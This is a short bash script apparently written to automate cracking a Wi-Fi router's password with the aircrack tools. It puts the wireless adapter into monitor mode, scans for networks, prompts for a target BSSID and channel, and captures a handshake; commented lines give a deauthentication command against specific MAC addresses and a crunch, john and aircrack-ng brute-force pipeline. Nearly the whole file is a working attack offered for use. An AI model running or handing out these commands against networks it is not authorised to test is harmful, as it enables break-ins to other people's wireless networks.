#!/bin/bash
#!-- format:u-tf8 --!
#--------------------------------------------------------------------------------#
# Autor: Juan Jose Solorzano
# Propose: This script provides a automated form to obtain the password of a wifi
# router using Aircrack programs.
# """ This file is not be able to crack a wpa2 encryptions """
#--------------------------------------------------------------------------------#

change_interface_mode(){
    #param 1: board name.
    #param 2: interface mode: 'ON' -> put the wifi board in monitor mode; 'OFF' put the wifi board in managed mode.
    #param 3:
    if [ "ON" == $2 ]; then # if the second parameter is not null then
        echo "Putting $1 adapter in a monitor mode ..."
        ifconfig $1 down
        iwconfig $1 mode monitor
        airmon-ng check kill 1>/dev/null
        ifconfig $1 up
        status=$(iwconfig | grep -i "Mode")
        echo "Board status $status"
        echo "Monitor mode -> done"
        sleep 3s
    elif [ "OFF" == $2 ]; then
        echo "Starting wifi normally..."
        ifconfig $1 down
        iwconfig $1 mode Managed
        ifconfig $1 up
        sleep 1s
        service NetworkManager start
    fi 
}

# The first thing is to know the name of the current wifi board.
b_name=$(ifconfig | grep "w" | awk '{print $1}') # gets the interface name.
b_name=${b_name%:} # remove the ':' character

# Change the mode of the wifi board.
#change_interface_mode $b_name "ON"
airodump-ng $b_name
sleep 0.5s
#change_interface_mode $b_name "OFF"
# Getting the bssid target
read -p "Put the bssid target: " bssid
read -p "Put the channel of the $bssid: " channel
#airodump-ng --bssid [bssid] --channel [num.of.channel] --write [file.name]
airodump-ng --bssid $bssid --channel $channel --write handshake $b_name
# aireplay-ng --deauth 4 -a 60:D2:48:B3:8A:65 -c 44:D8:78:10:3E:D8 wlp3s0

# crunch 10 10 | john --stdin --session=wpa --stdout | aircrack-ng -w - -b 60:D2:48:B3:8A:65  handshake-01.cap


#To save a file with the log
